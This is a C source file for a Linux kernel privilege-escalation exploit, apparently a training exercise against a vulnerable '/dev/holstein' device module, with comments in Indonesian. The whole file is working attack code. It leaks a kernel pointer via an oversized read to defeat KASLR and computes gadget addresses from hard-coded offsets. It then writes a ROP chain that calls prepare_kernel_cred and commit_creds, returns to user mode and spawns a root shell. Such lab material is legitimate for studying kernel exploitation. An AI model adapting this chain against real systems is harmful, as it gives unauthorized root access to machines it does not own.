#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define ERR(msg)                                                               \
  do {                                                                         \
    perror(msg);                                                               \
    exit(EXIT_FAILURE);                                                        \
  } while (0)

unsigned long user_cs, user_ss, user_rsp, user_rflags;
unsigned long prepare_kernel_cred;  //0x6e240
unsigned long commit_creds; //0x6e390
unsigned long pop_rdi; //0x27bbdc
unsigned long pop_rcx; //0x32cdd3
unsigned long mov_rdi_rax_rep_movsq; //0x60c96b
unsigned long swapgs; //0x800e26
unsigned long kbase, vfs_read;
int global_fd;

static void save_state() {
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_rsp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax;");
}

static void shell() {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    puts("ROOOOT");
    execve("/bin/sh", argv, envp);
}

void leak()
{
    global_fd = open("/dev/holstein",O_RDWR);
    if(global_fd == -1){
        ERR("open(holstein)");
    }else{
        puts("/dev/holstein terbuka");
    }

    //membocorkan kernel base
    printf("[*] tahap pertama, leaked\n");
    char buff[0x500];
    memset(buff,'A',0x480);
    read(global_fd,buff,0x410);

    for(int i=0;i < 0x480; i++){
       //printf("[*]leaked = 0x%016lx\n",*(unsigned long*)(buff + i * 8) & 0xfff);
       if((*(unsigned long*)(buff + i * 8) & 0xfff) == 0x33c){
       vfs_read = *(unsigned long*)(buff + i * 8);
       break;
       }
    }

    kbase = vfs_read - (0xffffffff8113d33c - 0xffffffff81000000);
    pop_rdi = kbase + 0x27bbdc;
    pop_rcx = kbase + 0x32cdd3;
    mov_rdi_rax_rep_movsq = kbase + 0x60c96b;
    swapgs = kbase + 0x800e26;
    commit_creds = kbase + 0x6e390;
    prepare_kernel_cred = kbase + 0x6e240;

    printf("kbase : 0x%016lx\n" ,kbase);
    printf("vfs_read: 0x%016lx\n" ,vfs_read);
    printf("commit_creds: 0x%016lx\n" ,commit_creds);
    printf("prepare_kernel_cred: 0x%016lx\n" ,prepare_kernel_cred);
    printf("swapgs: 0x%016lx\n" ,swapgs);
    printf("pop_rdi: 0x%016lx\n" ,pop_rdi);
    printf("pop_rcx: 0x%016lx\n" ,pop_rcx);
    printf("mov_rdi_rax_rep_movsq: 0x%016lx\n" ,mov_rdi_rax_rep_movsq);
    
}

void rop()
{
    puts("[+]tahap kedua, rop");
    char buff[0x500];
    memset(buff,'B',0x480);

    unsigned long *rop = (unsigned long*)(buff + 0x408);
    *rop++ = pop_rdi;
    *rop++ = 0;
    *rop++ = prepare_kernel_cred;
    *rop++ = pop_rcx;
    *rop++ = 0;
    *rop++ = mov_rdi_rax_rep_movsq;
    *rop++ = commit_creds;
    *rop++ = swapgs;
    *rop++ = 0xdeadbeef;
    *rop++ = 0xdeadbeef;
    *rop++ = (unsigned long)shell; //[rdi+0x10]
    *rop++ = user_cs; //[rdi+0x18 ]
    *rop++ = user_rflags; //[rdi+0x20]
    *rop++ = user_rsp;  //[rdi+0x28]
    *rop++ = user_ss; //[rdi+0x30]
    
    write(global_fd,buff,(void*)rop-(void*)buff);
}


int main()
{
    save_state();

    leak();
    
    rop();

    close(global_fd);

    return EXIT_SUCCESS;
}
